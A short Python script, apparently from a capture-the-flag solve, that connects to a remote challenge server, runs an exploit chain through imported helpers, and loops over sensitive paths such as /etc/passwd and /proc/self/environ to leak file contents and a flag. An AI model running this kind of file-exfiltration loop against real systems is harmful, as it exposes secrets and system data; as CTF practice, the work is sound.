from solution import connect_remote, recover_offsets, run_oath, try_incbin, extract_flag
import string

def is_printable(c):
    return chr(c) in string.printable and chr(c) not in '\r\n\t\x0b\x0c'

paths = [
    '/proc/self/environ',
    '/proc/self/cmdline',
    '/etc/hostname',
    '/etc/passwd',
    'pwnjail.py',
    './pwnjail.py',
    '/app/pwnjail.py',
    '/home/ctf/pwnjail.py',
    '/challenge/pwnjail.py',
    '/proc/1/environ',
    '/proc/1/cmdline'
]

host = 'challs.insec.club'
port = 40001

for path in paths:
    try:
        io = connect_remote(host, port)
        io.recvuntil(b'> ')
        
        offsets = recover_offsets(io)
        run_oath(io, offsets)
        
        blob = try_incbin(io, path)
        if blob:
            flag = extract_flag(blob)
            print(f"PATH {path} => OK size={len(blob)} flag={flag}")
            
            # Print first 200 printable-ish chars
            preview = "".join(chr(c) if 32 <= c <= 126 else "." for c in blob[:200])
            print(preview)
        else:
            print(f"PATH {path} => FAIL")
            
        io.close()
    except Exception as e:
        print(f"PATH {path} => ERROR: {e}")
        try:
            io.close()
        except:
            pass
